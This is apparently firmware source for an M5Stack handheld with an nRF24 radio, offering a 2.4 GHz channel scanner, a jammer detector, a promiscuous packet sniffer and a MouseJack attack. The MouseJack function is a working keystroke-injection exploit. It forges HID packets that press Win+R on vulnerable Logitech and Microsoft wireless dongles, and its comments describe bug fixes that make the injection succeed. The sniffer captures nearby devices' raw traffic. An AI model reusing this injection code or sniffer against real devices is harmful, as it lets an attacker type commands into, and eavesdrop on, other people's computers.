#include "nrf24_module.h"
#include "../../core/display.h"
#include "../../core/menu.h"
#include "../../globals.h"
#include <M5Unified.h>
#include <RF24.h>
#include <SPI.h>

static RF24* s_radio = nullptr;

// ─── Init / Deinit ────────────────────────────────────────────
bool nrf24_init() {
    // Both CC1101 (ELECHOUSE) and NRF24 share the global Arduino SPI object.
    // ELECHOUSE calls SPI.begin(SCK, MISO, MOSI) via setSpiPin() during rf_init,
    // so by the time we arrive here SPI is already configured with the RF Pack
    // pins.  We pass &SPI — never a second SPIClass(SPI2_HOST) instance, because
    // ESP-IDF only allows one spi_bus_initialize() per host.
    if (!s_radio) {
        s_radio = new RF24(NRF24_CE, NRF24_CS, 4000000);
    }
    // RF24 with RF24_SPI_TRANSACTIONS (ESP32 default) does NOT call SPI.begin()
    // internally. Re-initialise the bus here so NRF24 works even if CC1101 init
    // ran first (ELECHOUSE only calls SPI.begin inside a successful SPI transfer).
    //
    // CRITICAL: ELECHOUSE configures the SPI peripheral with CC1101_CS as the
    // *hardware* chip-select pin.  On ESP32, calling SPI.begin() without a CS arg
    // does not always clear that — the peripheral may still toggle CC1101_CS during
    // NRF24 transactions, pulling MISO low (CC1101 response) and corrupting the
    // NRF24 bus.  Force CC1101_CS HIGH before taking the bus so CC1101 stays silent.
    pinMode(CC1101_CS, OUTPUT);
    digitalWrite(CC1101_CS, HIGH);
    delayMicroseconds(50);           // let MISO settle after CC1101 deselect
    // Fully release any residual SPI state (ELECHOUSE may have left hardware CS
    // configured to CC1101_CS pin 2) before reclaiming the bus for NRF24.
    SPI.end();
    delayMicroseconds(50);
    SPI.begin(RF_SPI_SCK, RF_SPI_MISO, RF_SPI_MOSI);
    if (!s_radio->begin(&SPI)) {
        Serial.println("[NRF] NRF24 NOT FOUND");
        g_nrf_ready = false;
        return false;
    }
    s_radio->setPALevel(RF24_PA_MAX);
    s_radio->setDataRate(RF24_2MBPS);
    s_radio->setAutoAck(false);
    s_radio->disableCRC();
    g_nrf_ready    = true;
    g_nrf_detected = true;   // latch — survives nrf24_deinit()
    return true;
}

void nrf24_deinit() {
    if (s_radio) { s_radio->powerDown(); }
    g_nrf_ready = false;
}

// ─── Channel Scan (2.4 GHz spectrum) ─────────────────────────
#define NRF_CHANNELS  126
static uint8_t s_ch_power[NRF_CHANNELS] = {0};

void nrf24_scan_run() {
    if (!nrf24_init()) { show_error("NRF24 not found!\nCheck RF Pack wiring."); delay(2000); return; }

    display_clear();
    draw_header("2.4GHz Scan");
    draw_footer("A:reset", "B:stop");

    s_radio->startListening();
    memset(s_ch_power, 0, sizeof(s_ch_power));

    uint32_t iter = 0;
    while (true) {
        M5.update();
        if (M5.BtnA.wasPressed()) {
            memset(s_ch_power, 0, sizeof(s_ch_power));
            iter = 0;
        }
        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;

        // Sweep all channels
        for (int ch = 0; ch < NRF_CHANNELS; ch++) {
            s_radio->setChannel(ch);
            s_radio->startListening();
            delayMicroseconds(128);
            s_radio->stopListening();
            if (s_radio->testRPD()) {
                s_ch_power[ch] = min(255, s_ch_power[ch] + 12);
            } else {
                s_ch_power[ch] = s_ch_power[ch] > 1 ? s_ch_power[ch] - 1 : 0;
            }
        }

        iter++;
        // Draw spectrum — compress 126ch into display width
        M5.Lcd.fillRect(0, CONTENT_Y, DISP_W, CONTENT_H - 10, CLR_BG);
        for (int x = 0; x < DISP_W; x++) {
            int ch = (x * NRF_CHANNELS) / DISP_W;
            int bar = (s_ch_power[ch] * (CONTENT_H - 12)) / 255;
            uint16_t col = s_ch_power[ch] > 100 ? CLR_ERR :
                           s_ch_power[ch] > 40  ? CLR_WARN : CLR_PRIMARY;
            if (bar > 0)
                M5.Lcd.drawFastVLine(x, CONTENT_Y + CONTENT_H - 12 - bar, bar, col);
        }
        // Freq labels
        M5.Lcd.setTextSize(1);
        M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
        M5.Lcd.setCursor(0, CONTENT_Y + CONTENT_H - 10);
        M5.Lcd.print("2.4G");
        M5.Lcd.setCursor(DISP_W - 36, CONTENT_Y + CONTENT_H - 10);
        M5.Lcd.print("2.52G");
        M5.Lcd.setTextColor(CLR_PRIMARY, CLR_BG);
        M5.Lcd.setCursor(DISP_W/2 - 12, CONTENT_Y + CONTENT_H - 10);
        M5.Lcd.printf("i%lu", iter);
        delay(5);
    }
    nrf24_deinit();
}

// ─── MouseJack ────────────────────────────────────────────────
// MouseJack exploits unencrypted NRF24 HID dongles.
// Broadcasts HID keystrokes on known-vulnerable dongle addresses.
//
// Fix notes vs original code:
//   BUG1 — disableCRC() prevented dongle from accepting packets.
//           Vulnerable dongles run Enhanced ShockBurst (ESB) which
//           requires valid CRC. We must send WITH CRC matching the
//           dongle's config (2-byte CRC is the Logitech default).
//   BUG2 — No key-release sent after keydown. Without a release
//           (all-zero HID report) the target sees an infinite key
//           repeat. Send a zero report immediately after keydown.
//   BUG3 — sizeof(MJ_ADDRS)/5 works only when every element is
//           exactly 5 bytes; fragile if the array ever changes.
//           Fixed to sizeof(MJ_ADDRS)/sizeof(MJ_ADDRS[0]).
static const uint8_t MJ_ADDRS[][5] = {
    {0xBB, 0x0A, 0xDC, 0xA5, 0x75},  // Common Logitech Unifying dongle
    {0x5C, 0xE8, 0x33, 0x12, 0x00},  // Common Microsoft / generic dongle
};
#define MJ_ADDR_COUNT  (sizeof(MJ_ADDRS) / sizeof(MJ_ADDRS[0]))   // FIX BUG3

// Build a 19-byte Logitech ESB HID keyboard report.
// Returns payload length (always 19).
static uint8_t _mj_keystroke(uint8_t* pkt, uint8_t hid, uint8_t mod = 0) {
    memset(pkt, 0, 19);
    pkt[0] = 0x00;  // Device address byte (device index, try 0x00)
    pkt[1] = 0x60;  // Payload type: HID keyboard data + keepalive flag
    pkt[2] = 0x00;
    pkt[3] = mod;   // Modifier byte (0x08 = GUI/Win, 0x02 = LShift, etc.)
    pkt[4] = 0x00;
    pkt[5] = hid;   // HID keycode
    return 19;
}

void nrf24_mousejack_run() {
    if (!nrf24_init()) { show_error("NRF24 not found!"); delay(2000); return; }

    display_clear();
    draw_header("MouseJack");
    M5.Lcd.setTextSize(1);
    M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
    M5.Lcd.setCursor(4, CONTENT_Y + 2);
    M5.Lcd.print("Injecting HID on known\ndongle addresses...");
    draw_footer("", "B:stop");

    // FIX BUG1: enable 2-byte CRC — ESB dongles require valid CRC to
    // accept a packet.  Without CRC the dongle silently discards every
    // frame and nothing reaches the HID stack.
    s_radio->setDataRate(RF24_2MBPS);
    s_radio->setPayloadSize(19);
    s_radio->setAddressWidth(5);
    s_radio->setCRCLength(RF24_CRC_16);   // 2-byte CRC — also enables CRC (Logitech default)
    s_radio->setAutoAck(true);            // ack = dongle confirmed receipt
    s_radio->setRetries(3, 5);            // 5 retries, 1ms spacing

    uint32_t found = 0;
    while (true) {
        M5.update();
        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;

        // Sweep typical Logitech / MS dongle channels (2, 5, 8 ... 74)
        for (int ch = 2; ch <= 74; ch += 3) {
            s_radio->setChannel(ch);

            for (size_t a = 0; a < MJ_ADDR_COUNT; a++) {   // FIX BUG3
                s_radio->openWritingPipe(MJ_ADDRS[a]);

                // ── KEYDOWN: Win+R (opens Run dialog on Windows) ──────
                uint8_t pkt[19];
                _mj_keystroke(pkt, 0x15, 0x08);  // 0x15=r  0x08=GUI/Win
                if (s_radio->write(pkt, 19)) {
                    found++;
                    M5.Lcd.fillRect(0, CONTENT_Y + 26, DISP_W, 28, CLR_BG);
                    M5.Lcd.setTextColor(CLR_SUCCESS, CLR_BG);
                    M5.Lcd.setCursor(4, CONTENT_Y + 28);
                    M5.Lcd.printf("INJECTED ch%d addr%u  #%lu", ch, (unsigned)a, found);

                    delay(20);  // brief key-hold before release

                    // FIX BUG2: key-release — send all-zero HID report so the
                    // target doesn't see an infinite key repeat.
                    memset(pkt, 0, 19);
                    pkt[1] = 0x60;   // keep payload type; keycodes all zero
                    s_radio->write(pkt, 19);

                    delay(200);  // let the Run dialog open before next inject
                }
            }
        }
        delay(10);
    }
    nrf24_deinit();
}

// ─── Sniffer ──────────────────────────────────────────────────
// Promiscuous-mode technique:
//   - 2-byte address {0xAA, 0xAA}:  0xAA = 10101010 is the nRF24 preamble
//     pattern.  A 2-byte address with the preamble value causes the radio to
//     latch on any burst whose preamble runs into the address field — the
//     shortest possible address width maximises hit probability.
//   - CRC disabled: removes the validity filter so mis-addressed / raw frames
//     pass through to the FIFO.
//   - All three data rates tried: most nRF24 devices use 250K or 1M, not 2M.
//     Rotate with BtnA long-press.
//   - Auto-sweep: hop every SNIFF_HOP_MS across all channels.  Pauses for
//     SNIFF_STICKY_MS when a packet is found to capture more from that source.
//   - BtnA short: toggle auto / manual.  In manual, short-press steps the
//     channel up; long-press steps the data rate.
#define SNIFF_HOP_MS     50    // ms per channel in auto-sweep
#define SNIFF_STICKY_MS  3000  // ms to stay on a hot channel after a hit

void nrf24_sniff_run() {
    if (!nrf24_init()) { show_error("NRF24 not found!"); delay(2000); return; }

    // ── Promiscuous config ──────────────────────────────────────
    s_radio->setAddressWidth(2);                               // minimum width
    static const uint8_t PROMISC_ADDR[2] = {0xAA, 0xAA};     // preamble pattern
    s_radio->openReadingPipe(1, PROMISC_ADDR);
    s_radio->disableCRC();
    s_radio->setAutoAck(false);
    s_radio->setPayloadSize(32);

    // ── Data rate cycle ──────────────────────────────────────────
    static const rf24_datarate_e RATES[]     = {RF24_1MBPS, RF24_250KBPS, RF24_2MBPS};
    static const char* const     RATE_NAMES[] = {"1Mbps", "250K", "2Mbps"};
    uint8_t rate_idx = 0;  // Start at 1 Mbps — most common for nRF24 devices
    s_radio->setDataRate(RATES[rate_idx]);

    display_clear();
    draw_header("NRF Sniffer");
    draw_footer("A:mode/ch", "B:stop");

    uint8_t  ch         = 2;
    bool     auto_sweep = true;
    uint32_t last_hop   = 0;
    uint32_t sticky_end = 0;   // millis() deadline for sticky hold
    uint32_t pkt_total  = 0;
    uint32_t pkt_last   = 0;   // packets at last rate/ch change (for delta)
    uint8_t  buf[32];
    bool     need_redraw_header = true;

    s_radio->setChannel(ch);
    s_radio->startListening();

    while (true) {
        M5.update();
        uint32_t now = millis();

        // ── Button handling ──────────────────────────────────────
        if (M5.BtnA.pressedFor(LONG_PRESS_MS)) {
            // Long-press A: cycle data rate
            rate_idx = (rate_idx + 1) % 3;
            s_radio->stopListening();
            s_radio->setDataRate(RATES[rate_idx]);
            s_radio->startListening();
            pkt_last        = pkt_total;
            need_redraw_header = true;
            delay(LONG_PRESS_MS + 50);   // consume the press
        } else if (M5.BtnA.wasPressed()) {
            if (auto_sweep) {
                // First short-press: switch to manual
                auto_sweep = false;
            } else {
                // Manual: step channel
                ch = (ch >= 125) ? 2 : ch + 1;
                s_radio->stopListening();
                s_radio->setChannel(ch);
                s_radio->startListening();
                pkt_last = pkt_total;
            }
            need_redraw_header = true;
        }
        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;

        // ── Auto channel sweep ────────────────────────────────────
        if (auto_sweep) {
            bool sticky = (now < sticky_end);
            if (!sticky && (now - last_hop >= SNIFF_HOP_MS)) {
                ch = (ch >= 125) ? 2 : ch + 1;
                s_radio->stopListening();
                s_radio->setChannel(ch);
                s_radio->startListening();
                last_hop = now;
                need_redraw_header = true;
            }
        }

        // ── Packet read ───────────────────────────────────────────
        if (s_radio->available()) {
            s_radio->read(buf, 32);
            pkt_total++;
            // Sticky hold on this channel
            sticky_end = now + SNIFF_STICKY_MS;

            // Draw packet
            M5.Lcd.fillRect(0, CONTENT_Y + 26, DISP_W, CONTENT_H - 26, CLR_BG);
            M5.Lcd.setTextSize(1);
            M5.Lcd.setTextColor(CLR_SUCCESS, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 28);
            M5.Lcd.printf("Total: %lu  ch%d [%s]", pkt_total, ch, RATE_NAMES[rate_idx]);
            M5.Lcd.setTextColor(CLR_TEXT, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 42);
            // Hex dump — 8 bytes per row, 2 rows
            for (int i = 0; i < 8; i++)  { M5.Lcd.printf("%02X ", buf[i]); }
            M5.Lcd.setCursor(4, CONTENT_Y + 54);
            for (int i = 8; i < 16; i++) { M5.Lcd.printf("%02X ", buf[i]); }
            M5.Lcd.setCursor(4, CONTENT_Y + 66);
            for (int i = 16; i < 24; i++){ M5.Lcd.printf("%02X ", buf[i]); }
            M5.Lcd.setCursor(4, CONTENT_Y + 78);
            for (int i = 24; i < 32; i++){ M5.Lcd.printf("%02X ", buf[i]); }
            need_redraw_header = true;
        }

        // ── Header row (channel / rate / mode) ─────────────────────
        if (need_redraw_header) {
            M5.Lcd.fillRect(0, CONTENT_Y, DISP_W, 24, CLR_BG);
            M5.Lcd.setTextSize(1);
            M5.Lcd.setTextColor(CLR_PRIMARY, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 2);
            M5.Lcd.printf("Ch:%3d  %s  [%s]",
                ch,
                RATE_NAMES[rate_idx],
                auto_sweep ? "AUTO" : "MAN");
            // Sticky indicator
            if (now < sticky_end) {
                M5.Lcd.setTextColor(CLR_WARN, CLR_BG);
                M5.Lcd.setCursor(DISP_W - 46, CONTENT_Y + 2);
                M5.Lcd.print("LOCKED");
            }
            M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
            M5.Lcd.setCursor(4, CONTENT_Y + 14);
            M5.Lcd.printf("pkts:%lu  addr:AA:AA  noCRC", pkt_total);
            need_redraw_header = false;
        }

        delay(1);
    }

    s_radio->stopListening();
    nrf24_deinit();
}

// ─── 2.4 GHz Jam Detect ──────────────────────────────────────
// Sweeps all 126 NRF24 channels using testRPD() (received power
// detector, triggers at > -64 dBm).  Counts how many channels are
// simultaneously "hot" per sweep.  A broadband jammer saturates a
// large fraction of the spectrum at once; normal WiFi/BT traffic
// touches only a handful of channels.
//
// Sensitivity notes:
//   - nRF24L01+ RPD register needs ~170 µs to settle after startListening().
//     We dwell 250 µs so the read is always after the settling window.
//   - Each channel is polled TWICE at 150 µs each.  A channel counts as hot
//     if EITHER poll returns true — a signal that appears briefly still trips
//     the counter.  Single-poll at 128 µs would miss fast bursts.
//   - Thresholds are tuned for real-world jammers visible from a few metres,
//     not direct contact.  Lower WARN/ALARM if you need more sensitivity.
#define JAM24_WARN_CH    5    // > this many hot channels = elevated
#define JAM24_ALARM_CH  20    // > this many hot channels = jam alarm
#define JAM24_DWELL_US  150   // µs per poll (×2 = 300 µs total per channel)

void nrf24_jam_detect_run() {
    if (!nrf24_init()) { show_error("NRF24 not found!\nCheck RF Pack wiring."); delay(2000); return; }

    display_clear();
    draw_header("2.4G Jam Detect");
    draw_footer("A:reset", "B:stop");

    uint32_t hot_now   = 0;
    uint32_t max_hot   = 0;
    uint32_t sweep_num = 0;

    while (true) {
        M5.update();
        if (M5.BtnA.wasPressed()) {
            hot_now = max_hot = sweep_num = 0;
        }
        if (M5.BtnB.wasPressed() || M5.BtnB.pressedFor(LONG_PRESS_MS)) break;

        // Full 126-channel sweep — double-poll each channel for reliability.
        // Settling: nRF24L01+ RPD needs ~170 µs after startListening() before
        // the bit is valid.  We dwell JAM24_DWELL_US (150 µs) twice per
        // channel for a total of 300 µs — well past the settling window.
        // A channel is hot if EITHER of the two polls detects RPD.
        hot_now = 0;
        for (int ch = 0; ch < NRF_CHANNELS; ch++) {
            bool hit = false;

            // Poll 1
            s_radio->setChannel(ch);
            s_radio->startListening();
            delayMicroseconds(JAM24_DWELL_US);
            s_radio->stopListening();
            if (s_radio->testRPD()) hit = true;

            // Poll 2 (if first miss — short-circuit on first hit to save time)
            if (!hit) {
                s_radio->startListening();
                delayMicroseconds(JAM24_DWELL_US);
                s_radio->stopListening();
                if (s_radio->testRPD()) hit = true;
            }

            if (hit) hot_now++;
        }
        sweep_num++;
        if (hot_now > max_hot) max_hot = hot_now;

        uint8_t  pct   = (uint8_t)((hot_now * 100UL) / NRF_CHANNELS);
        bool     alarm = (hot_now > JAM24_ALARM_CH);
        bool     warn  = (!alarm && hot_now > JAM24_WARN_CH);
        uint16_t col   = alarm ? CLR_ERR : warn ? CLR_WARN : CLR_SUCCESS;

        M5.Lcd.fillRect(0, CONTENT_Y, DISP_W, CONTENT_H, CLR_BG);
        M5.Lcd.setTextSize(1);

        // Hot-channel bar across full width
        int bar_w = (int)map((long)hot_now, 0L, (long)NRF_CHANNELS, 0L, (long)(DISP_W - 8));
        M5.Lcd.fillRect(4, CONTENT_Y + 2, DISP_W - 8, 12, CLR_DARK);
        if (bar_w > 0) M5.Lcd.fillRect(4, CONTENT_Y + 2, bar_w, 12, col);

        // Stats
        M5.Lcd.setTextColor(col, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 18);
        M5.Lcd.printf("Hot ch: %lu / %d  (%u%%)", hot_now, NRF_CHANNELS, pct);

        M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 30);
        M5.Lcd.printf("Peak: %lu ch   Sweep #%lu", max_hot, sweep_num);

        M5.Lcd.setTextColor(CLR_TEXT_DIM, CLR_BG);
        M5.Lcd.setCursor(4, CONTENT_Y + 44);
        M5.Lcd.printf("Warn>%dch  Alarm>%dch  2x150us", JAM24_WARN_CH, JAM24_ALARM_CH);

        // Status
        M5.Lcd.setCursor(4, CONTENT_Y + 60);
        if (alarm) {
            M5.Lcd.setTextSize(2);
            M5.Lcd.setTextColor(CLR_ERR, CLR_BG);
            M5.Lcd.print("!! JAM DETECTED !!");
        } else if (warn) {
            M5.Lcd.setTextColor(CLR_WARN, CLR_BG);
            M5.Lcd.print("WARNING: Elevated activity");
        } else {
            M5.Lcd.setTextColor(CLR_SUCCESS, CLR_BG);
            M5.Lcd.print("Normal - spectrum clear");
        }

        delay(5);
    }
    nrf24_deinit();
}

// ─────────────────────────────────────────────────────────────
//  Headless API — used by remote_ctrl FreeRTOS tasks
//  All functions operate on s_radio directly (same TU).
//  Caller must call nrf24_headless_init() first and
//  nrf24_headless_deinit() when done.  Do NOT mix these with
//  any CC1101 / rf_* call while a headless task is running.
// ─────────────────────────────────────────────────────────────

bool nrf24_headless_init()  { return nrf24_init();  }
void nrf24_headless_deinit(){ nrf24_deinit(); }

// One full 126-channel sweep.
// ch_power[i] is updated with EMA: +12 on RPD hit, -1 on miss.
void nrf24_headless_scan_sweep(uint8_t* ch_power, int count) {
    if (!s_radio) return;
    if (count > NRF_CHANNELS) count = NRF_CHANNELS;
    for (int ch = 0; ch < count; ch++) {
        s_radio->setChannel(ch);
        s_radio->startListening();
        delayMicroseconds(128);
        s_radio->stopListening();
        if (s_radio->testRPD()) {
            ch_power[ch] = (uint8_t)min(255, (int)ch_power[ch] + 12);
        } else {
            ch_power[ch] = ch_power[ch] > 1 ? ch_power[ch] - 1 : 0;
        }
    }
}

// One full sweep; returns hot-channel count.
// dwell_us: µs per poll (150 recommended).
// polls: how many times to poll each channel (1 or 2).
int nrf24_headless_jamdet_sweep(int dwell_us, int polls) {
    if (!s_radio) return 0;
    int hot = 0;
    for (int ch = 0; ch < NRF_CHANNELS; ch++) {
        bool hit = false;
        for (int p = 0; p < polls && !hit; p++) {
            s_radio->setChannel(ch);
            s_radio->startListening();
            delayMicroseconds(dwell_us);
            s_radio->stopListening();
            if (s_radio->testRPD()) hit = true;
        }
        if (hit) hot++;
    }
    return hot;
}

// Current channel tracked for sniff_poll
static uint8_t s_hl_sniff_ch = 2;

// Configure promiscuous sniffer mode.
// rate_idx: 0=1Mbps  1=250Kbps  2=2Mbps
void nrf24_headless_sniff_init(uint8_t rate_idx) {
    if (!s_radio) return;
    static const rf24_datarate_e RATES[3] = {RF24_1MBPS, RF24_250KBPS, RF24_2MBPS};
    s_radio->setDataRate(RATES[rate_idx < 3 ? rate_idx : 0]);
    s_radio->setAddressWidth(2);
    static const uint8_t PROMISC[2] = {0xAA, 0xAA};
    s_radio->openReadingPipe(1, PROMISC);
    s_radio->disableCRC();
    s_radio->setAutoAck(false);
    s_radio->setPayloadSize(32);
    s_hl_sniff_ch = 2;
    s_radio->setChannel(s_hl_sniff_ch);
    s_radio->startListening();
}

void nrf24_headless_sniff_set_ch(uint8_t ch) {
    if (!s_radio) return;
    s_hl_sniff_ch = ch;
    s_radio->stopListening();
    s_radio->setChannel(ch);
    s_radio->startListening();
}

bool nrf24_headless_sniff_poll(uint8_t* buf32, uint8_t* ch_out) {
    if (!s_radio || !s_radio->available()) return false;
    s_radio->read(buf32, 32);
    if (ch_out) *ch_out = s_hl_sniff_ch;
    return true;
}

// ─── Entry point ──────────────────────────────────────────────
void nrf24_module_run() {
    Menu m("2.4GHz / NRF24");
    m.add("Channel Scan", "S");
    m.add("MouseJack",    "M");
    m.add("Sniffer",      "P");
    m.add("Jam Detect",   "J");
    m.add("< Back",       " ");
    m.draw();

    while (true) {
        M5.update();
        if (M5.BtnA.wasPressed()) m.scroll_down();
        if (M5.BtnB.wasPressed()) {
            switch(m.selected()) {
                case 0: nrf24_scan_run();        break;
                case 1: nrf24_mousejack_run();   break;
                case 2: nrf24_sniff_run();       break;
                case 3: nrf24_jam_detect_run();  break;
                case 4: return;
            }
            m.draw();
        }
        if (M5.BtnB.pressedFor(LONG_PRESS_MS)) return;
        delay(10);
    }
}
